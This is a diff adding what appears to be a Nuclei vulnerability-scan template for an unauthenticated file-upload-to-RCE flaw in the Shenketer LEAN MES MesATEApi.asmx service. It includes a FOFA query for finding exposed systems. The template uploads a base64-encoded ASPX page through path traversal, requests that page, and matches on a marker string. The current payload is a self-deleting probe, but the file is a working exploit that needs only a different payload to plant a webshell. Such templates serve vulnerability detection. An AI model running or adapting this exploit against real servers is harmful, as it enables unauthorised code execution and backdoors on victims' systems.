@@ -1,0 +1,52 @@
+id: ShenKeTe-LEAN-MES-MesATEApi_asmx-File-Upload-RCE
+
+info:
+  name: 深科特LEAN MES系统 MesATEApi.asmx 文件上传致RCE
+  author: HuanXiong
+  severity: critical
+  description: |
+    fofa: title="LEAN MES - 用户登录" || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png"
+    深科特LEAN MES系统 MesATEApi.asmx 接口存在任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference:
+    -
+  tags: File Upload、RCE
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |-
+        POST /WebService/MesATEApi.asmx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+        Content-Type: text/xml; charset=utf-8
+        Content-Length: length
+        SOAPAction: "http://mesateapi.com/UploadFileToMES"
+        
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <UploadFileToMES xmlns="http://mesateapi.com/">
+              <empNo>string</empNo>
+              <sn>string</sn>
+              <resource>string</resource>
+              <station>string</station>
+              <fileBytes>PCVAUGFnZSBMYW5ndWFnZT0iQyMiJT48JVJlc3BvbnNlLldyaXRlKCJwYm95am5ucmZpcG1wbHN1a2RlY3p1ZHNlZnhteXdlIik7U3lzdGVtLklPLkZpbGUuRGVsZXRlKFJlcXVlc3QuUGh5c2ljYWxQYXRoKTslPg==</fileBytes>
+              <folderName>/../ertyui</folderName>
+              <fileName>{{username}}.aspx</fileName>
+            </UploadFileToMES>
+          </soap:Body>
+        </soap:Envelope>
+        
+  - raw:
+      - |-
+        GET /ertyui/{{username}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+        
+    matchers:
+      - type: dsl
+        name: RCE
+        dsl:
+          - "status_code==200 && contains_all(body,'pboyjnnrfipmplsukdeczudsefxmywe')"
